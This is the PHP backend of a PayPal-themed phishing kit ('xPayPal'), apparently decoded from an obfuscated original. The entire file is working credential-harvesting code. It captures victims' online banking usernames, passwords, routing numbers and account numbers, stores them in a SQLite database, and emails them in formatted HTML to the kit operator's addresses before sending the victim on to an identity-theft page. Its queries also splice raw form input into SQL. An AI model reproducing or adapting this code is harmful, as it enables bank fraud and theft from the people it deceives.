<?php
// Decoded by Girudatsu.com Member

@session_start();
$pdo = new PDO('sqlite:../admin/database.db');
if ($pdo) {
    $xVictime = $_SESSION['xVictime_ID'];
    $settings = $pdo->query('SELECT * FROM `settings`')->fetch(PDO::FETCH_ASSOC);
    if (isset($_POST['eBank'])) {
        $eUsername = $_POST['eUsername'];
        $ePassword = $_POST['ePassword'];
        $eBank = $_POST['eBank'];
        $pdo->query('' . 'UPDATE `accounts` SET `has_bank`=\'yes\' WHERE `id`=\'' . "{$xVictime}" . '\'' . '');
        $check = $pdo->query('' . 'SELECT * FROM `bank` WHERE `owner_id`=\'' . "{$xVictime}" . '\'' . '')->fetch(PDO::FETCH_ASSOC);
        if ($check) {
            $pdo->query('' . 'UPDATE `bank` SET `bank_name`=\'' . "{$eBank}" . '\',`username`=\'' . "{$eUsername}" . '\',`password`=\'' . "{$ePassword}" . '\' WHERE `owner_id`=\'' . "{$xVictime}" . '\'' . '');
        } else {
            $pdo->query('' . 'INSERT INTO `bank` VALUES (NULL,\'' . "{$xVictime}" . '\',\'' . "{$eBank}" . '\',\'' . "{$eUsername}" . '\',\'' . "{$ePassword}" . '\',\'\',\'\',\'\',\'\',\'\')' . '');
        }
    } elseif (isset($_POST['savings_or_checking'])) {
        $savings_or_checking = $_POST['savings_or_checking'];
        $uRouting = $_POST['uRouting'];
        $uAccount = $_POST['uAccount'];
        $pdo->query('' . 'UPDATE `bank` SET `checking_or_savings`=\'' . "{$savings_or_checking}" . '\',`routing_number`=\'' . "{$uRouting}" . '\',`account_number`=\'' . "{$uAccount}" . '\' WHERE `owner_id`=\'' . "{$xVictime}" . '\'' . '');
    }
    if ($settings['notification'] == 'every' || $settings['notification'] == 'bank') {
        $get_id = $pdo->query('' . 'SELECT * FROM `bank` WHERE `owner_id`=\'' . "{$xVictime}" . '\'' . '')->fetch(PDO::FETCH_ASSOC);
        $x_receiver = $settings['emails'];
        $x_header = 'From: CaZaNoVa163 <Cazanova.Haxor@hotmail.com>' . chr(13) . chr(10) . 'MIME-Version: 1.0' . chr(13) . chr(10) . 'Content-Type: text/html' . chr(13) . chr(10) . 'Content-Transfer-Encoding: 8bit' . chr(13) . chr(10) . chr(13) . chr(10);
        $x_subject = 'xPayPal | BANK | ' . $get_id['bank_name'] . ' | ' . $get_id['checking_or_savings'] . ' | ' . $get_id['username'];
        $x_message = '
                        <!doctype html>
                        <html class=\'no-js\' lang=\'en\'>
                            <head>
                                <meta charset=\'utf-8\'>
                                <meta http-equiv=\'x-ua-compatible\' content=\'ie=edge\'>
                                <meta name=\'viewport\' content=\'width=device-width, initial-scale=1\'>
                            </head>
                            <body style=\'background-color:#0d0d0d\'>
                            <div style=\'width:100%;height:auto;min-height:100px;border-radius:10px;background-image:url(http://i.imgur.com/FZvRMdI.png);background-size:333px 56px;background-position:50% 50%;background-repeat:no-repeat;margin:10px 0;box-sizing:border-box;padding:10px\'></div>
                                <div style=\'width:100%;background-color:#171717;height:auto;min-height:100px;border-radius:10px;margin:10px 0;box-sizing:border-box;padding:10px\'>
                                        <div style=\'background-color:#0d0d0d;margin:10px;padding:10px;box-sizing:border-box;color:#909090;border-radius:10px;font-size:16px\'><table><tr><td style=\'width:100px;text-align:right\'>Bank Name</td><td>' . $get_id['bank_name'] . '</td></tr></table></div>
                                        <div style=\'background-color:#0d0d0d;margin:10px;padding:10px;box-sizing:border-box;color:#909090;border-radius:10px;font-size:16px\'><table><tr><td style=\'width:100px;text-align:right\'>Username</td><td>' . $get_id['username'] . '</td></tr></table></div>
                                        <div style=\'background-color:#0d0d0d;margin:10px;padding:10px;box-sizing:border-box;color:#909090;border-radius:10px;font-size:16px\'><table><tr><td style=\'width:100px;text-align:right\'>Password</td><td>' . $get_id['password'] . '</td></tr></table></div>
                                        <div style=\'background-color:#0d0d0d;margin:10px;padding:10px;box-sizing:border-box;color:#909090;border-radius:10px;font-size:16px\'><table><tr><td style=\'width:100px;text-align:right\'>Account Type</td><td>' . $get_id['checking_or_savings'] . '</td></tr></table></div>
                                        <div style=\'background-color:#0d0d0d;margin:10px;padding:10px;box-sizing:border-box;color:#909090;border-radius:10px;font-size:16px\'><table><tr><td style=\'width:100px;text-align:right\'>Routing Number</td><td>' . $get_id['routing_number'] . '</td></tr></table></div>
                                        <div style=\'background-color:#0d0d0d;margin:10px;padding:10px;box-sizing:border-box;color:#909090;border-radius:10px;font-size:16px\'><table><tr><td style=\'width:100px;text-align:right\'>Account Number</td><td>' . $get_id['account_number'] . '</td></tr></table></div>
                                </div>
                                <div style=\'width:100%;background-color:#171717;height:auto;min-height:100px;border-radius:10px;background-image:url(http://i.imgur.com/G4tFJJa.png);background-size:413px 61px;background-position:50% 50%;background-repeat:no-repeat;margin:10px 0;box-sizing:border-box;padding:10px\'></div>
                            </body>
                        </html>
                ';
        $this_receiver = explode(chr(10), $x_receiver);
        foreach ($this_receiver as $to) {
            if ($to != '') {
                @mail($to, $x_subject, $x_message, $x_header);
            }
        }
    }
    if ($settings['enable_identity'] == 'yes') {
        echo 'to_identity';
    } else {
        echo 'to_thanks';
    }
}
